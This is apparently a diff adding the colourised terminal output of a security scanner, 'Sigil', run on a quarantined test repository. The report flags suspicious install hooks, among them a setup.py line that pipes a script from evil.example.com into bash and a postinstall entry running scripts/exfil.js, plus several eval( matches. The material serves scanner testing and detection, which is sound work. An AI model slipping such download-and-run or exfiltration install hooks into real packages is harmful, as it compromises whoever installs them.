@@ -1,0 +1,35 @@
+[0;34m[sigil][0m Copied to quarantine: /Users/reecefrazier/.sigil/quarantine/20260317_083616__
+
+[1m+----------------------------------------------+[0m
+[1m|               S I G I L  [0;34m🆓 FREE[0m               |[0m
+[1m|      Automated Security Analysis             |[0m
+[1m|              by NOMARK                       |[0m
+[1m+----------------------------------------------+[0m
+
+[0;34m📊 Basic Static Analysis[0m
+
+Target: /Users/reecefrazier/.sigil/quarantine/20260317_083616__
+Quarantine ID: 20260317_083616__
+Report: /Users/reecefrazier/.sigil/reports/20260317_083616___report.txt
+Started: Tue Mar 17 08:37:26 AEST 2026
+
+
+[1m=== Phase 1: Install Hook Analysis ===[0m
+[0;31m[FAIL][0m setup.py contains suspicious install hooks
+9:        import subprocess
+10:        subprocess.call(["curl", "-s", "https://evil.example.com/payload.sh", "|", "bash"])
+16:    cmdclass={"install": PostInstallCommand},
+[0;31m[FAIL][0m package.json contains install lifecycle scripts
+5:    "postinstall": "node scripts/exfil.js"
+8:    "postinstall": "lerna bootstrap",
+19:    "postinstall": "napi-postinstall unrs-resolver 1.11.1 check"
+8:    "postinstall": "lerna bootstrap",
+11:    "postinstall": "node scripts/install-binary.js",
+
+[1m=== Phase 2: Code Pattern Analysis ===[0m
+[1;33m[warn][0m Found 'eval(':
+/Users/reecefrazier/.sigil/quarantine/20260317_083616__/test-repo/types.d.ts:4:  eval(expression: string): any;
+/Users/reecefrazier/.sigil/quarantine/20260317_083616__/test-repo/types.d.ts:7:declare function eval(code: string): any;
+/Users/reecefrazier/.sigil/quarantine/20260317_083616__/test-repo/malicious.js:3:eval(code);  // Real eval call - dangerous!
+/Users/reecefrazier/.sigil/quarantine/20260317_083616__/archive/tests/test_forge.py:73:            "snippet": "eval(userInput)",
+/Users/reecefrazier/.sigil/quarantine/20260317_083616__/archive/tests/test_forge_enrichment.py:32:            "snippet": "eval(user_input)",
